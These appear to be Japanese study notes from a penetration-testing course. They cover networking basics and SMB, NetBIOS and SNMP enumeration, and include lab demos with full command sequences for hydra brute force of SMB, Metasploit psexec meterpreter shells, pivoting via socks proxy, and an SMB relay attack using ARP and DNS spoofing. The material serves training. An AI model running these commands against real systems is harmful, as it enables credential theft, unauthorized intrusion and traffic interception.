ネットワークの基礎
・コンピュータネットワークでは、ホスト同士は、ネットワークプロトコルを使用して互いに意思疎通をしている。
・ネットワークプロトコルは、違うハードウェアやソフトウェア同士が通信できるようにしている。
・プロトコルでの通信はパケットで行う。


・ネットワーキングの目的は、ネットワークにつながったコンピュータ間でやりとりすることで、パケットでやりとりする。
・パケットは、データ伝送に使用される電気信号でのビット列でしかない

・パケットは、ヘッダーとペイロードで構成される
→ヘッダー：パケットの制御情報
→ペイロード：データ本体

・OSIは、Open System Interconnectionで、電気通信システムやコンピュータシステムの機能を7つの抽象的なレイヤーに標準化するフレームワーク

・OSIモデル
1 物理層：デバイス間の物理的な接続
2 データリンク：物理媒体へのアクセス管理を行い、誤り検出を行う
3 ネットワーク：論理アドレスとルーティング
4 トランスポート：エンドツーエンドの通信を保証し、フロー制御を行う
5 セッション：アプリケーション間のセッションや接続管理
6 プレゼンテーション：アプリケーションと下層の間でデータを変換する
7　アプリケーション：ネットワークサービスをエンドユーザーやアプリケーションに直接提供


ファイアウォール検出とIDS回避
・-sn：ポートスキャンは行わずホストの生存確認のみ行う。
・-Pn：ホストの生存確認をスキップして、直接ポートスキャンを行う
・-f：送信するパケットを意図的に分割して送るオプション
・--mtu：フラグメントサイズを手動で設定できる

ネットワーク攻撃
ネットワーク列挙
・侵入テストのホスト検出とポートスキャンのフェーズの後、次に行う論理的なフィーズはサービスの列挙である。
・サービス列挙の目的は、ネットワーク上のホスト/システムやそれらのホスト上で稼働しているサービスについてより追加の具体的・詳細な情報を収集する
→この情報には、アカウント名,共有,誤設定されたサービスなどの情報が含まれる

SMBおよびNetBIOS列挙
・SMBとNetBIOSは、２つの異なる技術であるが、windowsネットワーク上でネットワーキングやファイルの共有の文脈で関連している

・NetBIOSは、ローカルネットワーク上で通信サービスを提供するためのAPIおよび一連のネットワークプロトコル
・主にネットワーク上で異なるコンピュータ上のアプリケーションを互いに見つけ、相互にやり取りすることを可能にするために使用される
・NetBIOSの主な機能
1) name service：コンピュータがローカルネットワーク内で登録、登録解除、名前解決を行えるようにする
2) datagram service：接続レス通信およびブロードキャスト通信をサポートする
3) session service：接続指向の通信をサポートし、より信頼性の高いデータ転送を実現する
・NetBIOSでは、主に、137(name service)、138(データグラムサービス）および139(セッションサービス）

・SMBは、ネットワークファイル共有プロトコルであり、ネットワーク上のコンピュータがファイル、プリンター、その他のリリースを共有できるようにする。
・SMBは、この目的でwindowsネットワークで使用される主要なプロトコル
・SMBの機能は、ファイルおよびプリンター共有、名前付きパイプやプロセス間通信の機能を提供する
・これによりユーザは、リモートコンピュータ上のファイルをローカルのようにアクセスできる。
・ポートは、445か139(NetBIOS)と併用際には

・NetBIOSとSMBはかつて密接に関連していたが、現在のネットワークでは主にファイルやプリンターの共有のためにSMBに依存している。
・現代では、windows実装では、SMBは使用されるが、NetBIOSなしでも動作可能

・nmblookup

quiz
・SMBは、NetBIOSをバイパスして直接通信するためにポート445を使用する
・最近のWindowsでは、SMBは優れたパフォーマンスとセキュリティを提供するので、NetBIOSではなくSMBを使用する。

Task NetBIOSハッキング
1) ターミナルを起動する
2) 以下のコマンドでドメインの生存確認
ping -c 5 ドメイン名
3) 以下のコマンドでターゲットマシンで開いているポートを確認する
nmap ターゲットドメイン
4) 以下のコマンドで、プロトコルに関する詳細情報を取得するために、ポート445でnmapを実行する。
nmap -sV -p ポート番号　ターゲットドメイン
5) 以下のコマンドで使用されているターゲットマシンでサポートされているすべてのSMBバージョンを特定する
nmap -p445 --script smb-protocols ターゲットドメイン
6) 以下のコマンドでSMBプロトコルのセキュリティレベルを見つける。
nmap -p445 --script smb-security-mode ターゲットIPアドレス
7) 以下のコマンドを使用して、ターゲットマシンで匿名アクセスできるかどうかを確認する
smbclient -L ターゲットドメイン
8) 以下のコマンドを使用して、現在のユーザをすべて見つける
nmap -p445 --script smb-enum-users.nse ターゲットドメイン
9) 8)で見つけたユーザ名をファイルを作成して保存する
nano users.txt
10) hydraツールを実行して、SMBプロトコルをブルートフォースし、指定したユーザと有効なパスコードを見つける
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ターゲットドメイン smb
＊-L：ユーザリスト
＊-P：パスワードリスト
11) Metasploitフレームワークを使用して、psexecエクスプロイトモジュールを実行し、管理者ユーザーの有効なパスワードを使用してmeterpreterシェルを取得
msfconsole -q
search psexec
use exploit/windows/smb/psexec
set RHOSTS ドメイン名
set SMBUser  ユーザ名
set SMBPass パスワード
exploit
12) 以下のコマンドで、現在のユーザ、システム情報、アーキテクチャーなどのターゲットマシンの情報を検出する
getuid
sysinfo
13) 侵入したホストから2番目のターゲットマシンにpingを実行
shell
ping ターゲットIPアドレス
14) meterpreterセッションを使用してルートを追加して2番目のマシンのサービスを識別する
Ctrl+C
run autoroute -s ターゲットIP
15) proxychainsツールを使用して、SOCKプロキシサーバーを起動し、攻撃者のマシン上のピボットシステムにアクセスする。
socks4a
cat /etc/proxychains4.conf
16) 15)で見つけたポートをMetasploit socks proxy補助サーバーモジュールを実行する
background
search socks_proxy
use auxiliary/server/socks_proxy
show options
17) ポートとバージョンを変更して実行する
set SRVPORT port_number
set VERSION バージョン
exploit
job
18) 以下のコマンドを使用して、proxychainを使用して、ピボットマシンのSMBポートを特定する
proxychains nmap ドメイン名 -sT -Pn -sV -p ポート番号
＊ドメイン名：ピボットマシン
＊-sT：TCP接続スキャン
＊-Pn：ホスト検出をスキップし、ポートスキャンを強制
19) net viewコマンドでターゲットマシンに共有されているすべてのリソースを見つける
sessions -i 1
shell
net view ターゲットIP
20) アクセス拒否を受け取ったら、プロセスをeplorer.exeに移行
Ctrl+C
migrate -N explorer.exe
shell 
net view ターゲットIP
21) 上で開いたドキュメントをnet useコマンド確認
22) マップされたドライブの中身をdirで確認


SNMP列挙
・SNMPは、ネットワーク機器を監視および管理するために広く使用されるプロトコル
・このプロトコルを使用することにより、ネットワーク管理者はデバイスの状態情報を問い合わせたり、特定の設定を構成したり、特定のイベントを発生した際にアラートやトラップを受信する

・SNMPは、通常UDPを輸送するアプリケーション層プロトコルで、以下の3つのコンポーネントが含まれる
1)  SNMPマネージャ：ネットワーク上のデバイスにあるSNMPエージェントへ問い合わせをしたり、やり取りを行う責任を持つシステム
2) SNMPエージェント：ネットワークデバイス上で動作し、SNMPクエリに応答したり、通知を送信するソフトウェア
3) 管理情報ベース：SNMPで利用可能なデータの構造を定義する階層型データベース

・SNMPには以下のバージョンが含まれる
1) SNMPv1：最初期のバージョンで、認証にコミュニティストリング（パスワード）を使用する
2) SNMPv2c：改良版で、大量のデータ転送をサポートするが、依然として認証には、パスワードを使用する
3) SNMPv3：暗号化、メッセージの完全性、ユーザベースの認証などのセキュリティ機能の導入
・ポートは、
1) 161(UDP)：SNMPクエリに使用
2) 162(UDP)：SNMPトラップに使用

・ペンテスにおけるSNMP列挙は、SNMPが有効になっているデバイスにクエリを送信し、潜在的な脆弱性、設定ミス、攻撃ポイントを特定するために有用な情報を収集する。

・SNMPの列挙では以下のことを行う
1) SNMP対応デバイスの特定：ネットワーク上でSNMPが有効になっているデバイスを特定して、それらが情報漏洩や攻撃に対して脆弱であるかを判断する。
2) システム情報の抽出：デバイス名、OS、ソフトウェアバージョン、ネットワークインターフェースなどのシステム関連データを収集する
3) SNMPコミュニティストリングの特定：既定または弱いコミュニティストリングをテストする（これらはデバイス情報への不正アクセスを許可する可能性がある）
4)  ネットワーク構成の取得：ルーティングテーブル、ネットワークインターフェース、IPアドレスその他のネットワーク固有の詳細情報を収集する
5) ユーザーおよびグループ情報の収集
6) サービスおよびアプリケーションの特定：ターゲットデバイス上で稼働しているサービスやアプリケーションを特定し、さらなる攻撃経路につながる可能性を調査する。

quiz
・ブルートフォースでSNMPコミュニティ文字列を検出できるために使用できるツールは、SNMPスクリプトを使用したNmap

demo snmp攻撃
1) ターミナル起動
2) 以下のコマンドを使用して、ターゲットマシンの生存確認
ping -c 5 IPアドレス
3) 以下のコマンドを使用して、マシンの開いているポートを確認
nmap IPアドレス
4) 以下のコマンドでSNMPのUDPポートが開いているかを確認する
nmap -sU -p 161 IPアドレス
5) ターゲットマシンにアクセスするためにコミュニティ文字列を見つけるために、ブルートフォース攻撃を行う。
nmap -sU -p 161 --script=snmp-brute IPアドレス
6) snmpwalkツールを実行して、SNMP経由ですべての情報を検索する。
snmpwalk -v バージョン -c コミュニティ文字列 ターゲットIP
7) 以下のコマンドを使用して、snmpwalkで得られなかったSNMP経由での情報を列挙する
nmap -sU -p 161 --script snmp-* IPアドレス > snmp_output
ls
8) snmp_outputに載っているusersに対してusers.txtを作成
9) hydraでブルートフォースを実行
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt IPアドレス smb
＊smb：hydraがブルートフォースを行うために使用するプロトコル
10) metasploit exploitモジュールを実行し、psexecにより、meterpreterを取得する。
msfconsole -q
use exploit/windows/smb/psexec
show options
11) 設定情報の入力
set RHOSTS IPアドレス
set SMBUSER brute-forceで判明したもの
set SMBPASS brute-forceで判明したもの
exploit
12) 最後にフラグを以下で見つける
shell
cd C:/
dir type:ファイル名



SMBリレー攻撃
・SMBリレー攻撃とは、攻撃者がSMBトラフィックを傍受し、改ざんして正規のサーバーに中継することで、不正にリソースへアクセスしたり悪意のある行動を実行したりするタイプのネットワーク攻撃
・この攻撃は、windowsでは、一般的で、SMBがファイル共有、プリント共有、その他のネットワークサービスに使用されている環境で発生する。

・SMBリレー攻撃の仕組み
1) 傍受
・攻撃者がクライアントとサーバーの間に中間者の位置を設定する。
→これは、ARPスプーフィング、DNSポイズニングまたは不正なSMBサーバの設置などの手法を使用して行う
2) 認証情報の捕捉
・クライアントが正規のサーバーにSMB経由で接続すると、認証データを送信する。
→攻撃者は、このデータをキャプチャーする。そこには、NTLMハッシュが含まれる
3) 正規サーバーへのリレー
・攻撃者は、捕捉したNTLMハッシュを復号せず、信頼された別のサーバーにそのまま中継する
→これによりなりすましが可能
4) アクセスの取得
・リレーの成功により攻撃者はサーバー上のリソースへのアクセス可能
→これには、機密ファイル、データベースまたは管理者権限が含まれる可能性がある。

quiz
・SMBリレー攻撃でDNSスプーフィングが使用される理由は、すべてのSMBリクエストを攻撃者のマシンにリダイレクトする
・SMBリレー攻撃を設定するためにmetasploitでよく使用されるツールは、smbrelay


demo
1) ターミナルを起動
2) msfconsole
3) 基本情報の設定
use exploit/windows/smb/smb_relay
set SRVHOST ターゲットIP
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST ターゲットIP
set SMBHOST ターゲットIP
4) 攻撃
exploit
5) 設定
echo "ターゲットIPアドレス *.sportsfoo.com" > dns
*sportsfoo.com：攻撃者のマシン
6) DNSスプーフィング
dnsspoof -i eth1 -f dns
7) アクティブ化する
echo 1 > /proc/sys/net/ipv4/ip_forward
8) 2つの別々の端末で、ARPスプーフィング攻撃を行う
arpspoof -i eth1 -t ターゲットIP1 ターゲットIP2
arpspoof -i eth1 -t ターゲットIP2 ターゲットIP1
9) meterpresessionと対話する。
sessions
sessions -i 1
getuid
